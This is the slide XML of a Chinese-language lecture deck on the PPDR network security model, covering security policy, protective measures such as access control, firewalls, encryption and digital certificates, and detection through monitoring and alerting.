                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="5400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>P</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" b="1" dirty="0"/>
              <a:t>PDR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3200" b="1" dirty="0"/>
              <a:t>：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Policy </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3200" b="1" dirty="0"/>
              <a:t>策略</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" kern="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>模型的核心</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" kern="1200" dirty="0">
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>，所有的防护、检测、响应都是依据安全策略实施的。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="77827" name="标题 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="934244" y="703262"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PPDR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>理解</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="533400" y="2932260"/>
            <a:ext cx="8287072" cy="424732"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>策略体系</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>的建立包括安全策略的制定、评估与执行等。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="矩形 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="533400" y="3471737"/>
            <a:ext cx="4572000" cy="2117503"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>策略</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>包括：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1257300" lvl="2" indent="-342900">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="p"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="新宋体" panose="02010609030101010101" pitchFamily="49" charset="-122"/>
                <a:ea typeface="新宋体" panose="02010609030101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>访问控制策略</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1257300" lvl="2" indent="-342900">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="p"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="新宋体" panose="02010609030101010101" pitchFamily="49" charset="-122"/>
                <a:ea typeface="新宋体" panose="02010609030101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>加密通信策略</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1257300" lvl="2" indent="-342900">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="p"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="新宋体" panose="02010609030101010101" pitchFamily="49" charset="-122"/>
                <a:ea typeface="新宋体" panose="02010609030101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>身份认证策略</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1257300" lvl="2" indent="-342900">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="p"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="新宋体" panose="02010609030101010101" pitchFamily="49" charset="-122"/>
                <a:ea typeface="新宋体" panose="02010609030101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>备份恢复策略</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1257300" lvl="2" indent="-342900">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="p"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2200" b="1" dirty="0">
                <a:latin typeface="新宋体" panose="02010609030101010101" pitchFamily="49" charset="-122"/>
                <a:ea typeface="新宋体" panose="02010609030101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>……</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="图片 5"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5580112" y="3505739"/>
            <a:ext cx="2664296" cy="2716535"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2349099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7826">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="778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782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7826">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="11" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="7782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782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500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="24" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>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build="p"/>
      <p:bldP spid="3" grpId="0"/>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type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1111667" y="1180411"/>
            <a:ext cx="6421437" cy="792088"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" b="1" dirty="0"/>
              <a:t>P</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="5400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>P</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" b="1" dirty="0"/>
              <a:t>DR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3200" b="1" dirty="0"/>
              <a:t>： </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Protection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3200" b="1" dirty="0"/>
              <a:t>防护</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="78851" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="997568" y="709612"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>P</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PDR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>的理解</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="矩形 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683568" y="2105231"/>
            <a:ext cx="7776864" cy="830997"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>通过传统的静态安全技术和方法提高网络的防护能力，主要包括：</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683568" y="3068960"/>
            <a:ext cx="4572000" cy="2677656"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="1200150" lvl="2" indent="-285750">
              <a:buClr>
                <a:srgbClr val="C00000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="u"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>访问控制技术</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1657350" lvl="3" indent="-285750">
              <a:buClr>
                <a:srgbClr val="0033CC"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="l"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:latin typeface="黑体" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>ACL</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1657350" lvl="3" indent="-285750">
              <a:buClr>
                <a:srgbClr val="0033CC"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="l"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:latin typeface="黑体" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>Firewall</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="2" indent="-285750">
              <a:buClr>
                <a:srgbClr val="C00000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="u"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>信息加密技术</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="2" indent="-285750">
              <a:buClr>
                <a:srgbClr val="C00000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="u"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>身份鉴别技术</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1657350" lvl="3" indent="-285750">
              <a:buClr>
                <a:srgbClr val="0033CC"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="l"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="黑体" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>一次性口令</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1657350" lvl="3" indent="-285750">
              <a:buClr>
                <a:srgbClr val="0033CC"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="l"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:latin typeface="黑体" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>X.509(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="黑体" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>数字证书</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:latin typeface="黑体" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="2" indent="-285750">
              <a:buClr>
                <a:srgbClr val="C00000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="u"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0"/>
              <a:t>……</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52120" y="3054325"/>
            <a:ext cx="2464817" cy="2692291"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="26872265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850">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="7885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885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p:bldP spid="2" grpId="0"/>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noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1008062" y="1203920"/>
            <a:ext cx="7452369" cy="928936"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" b="1" dirty="0"/>
              <a:t>PP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="5400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>D</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" b="1" dirty="0"/>
              <a:t>R</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3200" b="1" dirty="0"/>
              <a:t>： </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Detection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3200" b="1" dirty="0"/>
              <a:t>检测</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="79875" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1100138" y="777875"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>P</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PDR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>的理解</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="矩形 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875830" y="3027823"/>
            <a:ext cx="7584601" cy="707886"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750">
              <a:buClr>
                <a:srgbClr val="0033CC"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="p"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="仿宋_GB2312" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>使安全防护从被动防护演进到主动防御，是整个模型动态性的体现。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="835280" y="2278613"/>
            <a:ext cx="7625151" cy="707886"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750">
              <a:buClr>
                <a:srgbClr val="0033CC"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="p"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="仿宋_GB2312" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>利用检测工具，监视、分析、审计网络活动，了解判断网络系统的安全状态。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="矩形 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875830" y="3771267"/>
            <a:ext cx="4572000" cy="1646605"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750">
              <a:buClr>
                <a:srgbClr val="0033CC"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="p"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="仿宋_GB2312" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>主要方法包括：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="2" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="FF0000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="u"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="楷体_GB2312" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>实时监控</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="2" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="FF0000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="u"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="楷体_GB2312" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>检测</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="2" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="FF0000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="u"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="楷体_GB2312" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>报警</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84660" y="3886168"/>
            <a:ext cx="4108263" cy="2075555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
